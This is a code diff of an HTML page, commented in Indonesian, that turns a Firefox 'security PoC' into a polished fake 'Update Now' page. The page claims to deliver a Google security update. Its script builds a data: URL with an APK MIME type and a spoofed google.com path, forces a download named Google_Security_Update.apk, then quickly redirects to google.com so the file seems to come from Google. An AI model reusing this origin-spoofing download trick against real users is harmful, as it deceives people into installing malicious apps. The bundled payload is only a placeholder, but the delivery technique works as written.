@@ -3,54 +3,69 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Firefox Security PoC - Same Tab</title>
+    <title>Firefox Security Research - Perfect Spoof</title>
     <style>
-        body { font-family: sans-serif; background: #121212; color: white; text-align: center; padding: 50px; }
-        .btn-exploit { 
-            background: #ffffff; color: black; padding: 20px; border: none; 
-            border-radius: 10px; cursor: pointer; font-weight: bold; font-size: 1.1em;
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: #121212; color: white; text-align: center; padding: 50px 20px; 
         }
-        #status { margin-top: 20px; color: #00e676; font-family: monospace; }
+        .container { 
+            background: #1e1e1e; border-radius: 15px; padding: 30px; 
+            max-width: 400px; margin: auto; border: 1px solid #333;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        h2 { color: #00e676; margin-top: 0; }
+        p { color: #bbb; font-size: 0.9em; line-height: 1.6; }
+        .btn-exploit { 
+            background: #ffffff; color: black; width: 100%; padding: 18px; 
+            border: none; border-radius: 10px; cursor: pointer; font-weight: bold; 
+            font-size: 16px; transition: 0.2s; margin-top: 20px;
+        }
+        .btn-exploit:active { transform: scale(0.98); background: #e0e0e0; }
+        #status { margin-top: 20px; color: #ffd740; font-family: monospace; font-size: 12px; }
     </style>
 </head>
 <body>
 
-    <h2>Firefox Exploit PoC</h2>
-    <p>Target: Same Tab Redirection + Origin Spoofing</p>
-    
-    <button class="btn-exploit" onclick="startExploit()">Execute Attack</button>
-    <div id="status">Status: Ready</div>
+    <div class="container">
+        <h2>Security Test</h2>
+        <p>Aplikasi ini akan mensimulasikan pembaruan keamanan melalui jalur resmi Google.</p>
+        
+        <button class="btn-exploit" onclick="executePerfectAttack()">Update Now</button>
+
+        <div id="status">Status: Ready</div>
+    </div>
 
     <script>
-        function startExploit() {
+        function executePerfectAttack() {
             const status = document.getElementById('status');
             
-            // Payload APK Valid (Magic Bytes PK..)
+            // 1. APK Payload dengan Magic Bytes agar tidak jadi .txt
             const apkPayload = "UEsDBBQAAAAIAAAAAAAAAAAAAAAAAAAAAAAACQAAAGhlbGxvLnR4dFV0RAsAA2SjdWZko3VmdXgLAAEE6AMAAAToAwAAUEsBAhQDFAAAAAgAAAAAAAAAAAAAAAAAAAAAAAkAAAAAAAAAAAAAAAAAAAAAaGVsbG8udHh0VXRFAANZp3VmdKd1ZnV4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAEUAAABZAAAAAAA=";
-            
-            // Teknik Authority Injection kamu
+
+            // 2. Authority Injection untuk Spoofing Origin
             const mimeType = "application/vnd.android.package-archive";
             const spoofPath = "/\\\\\\/.google.com/application/x-msdownload";
             const finalURL = `data:${mimeType};${spoofPath};base64,${apkPayload}`;
 
-            status.innerText = "Status: Triggering Download...";
+            status.innerText = "Status: Processing request...";
 
-            // 1. Buat elemen download
+            // 3. Siapkan elemen download
             const a = document.createElement("a");
             a.href = finalURL;
             a.download = "Google_Security_Update.apk";
             document.body.appendChild(a);
             
-            // 2. Klik unduhan
+            // 4. Picu Download
             a.click();
 
-            // 3. SEGERA setelah klik, pindahkan lokasi halaman ke Google
-            // Jeda 500ms memberikan waktu bagi browser untuk memproses request download
-            // sebelum halaman dibersihkan (unloaded) oleh navigasi baru.
+            // 5. RACE CONDITION: Redirect sangat cepat
+            // Kita gunakan 200ms agar browser mulai memuat Google
+            // tepat saat dialog download Firefox sedang 'pop up'.
             setTimeout(() => {
-                status.innerText = "Status: Redirecting...";
-                location.href = "https://www.google.com";
-            }, 1500);
+                status.innerText = "Status: Redirecting to Official Source...";
+                location.replace("https://www.google.com");
+            }, 200); 
         }
     </script>
 </body>
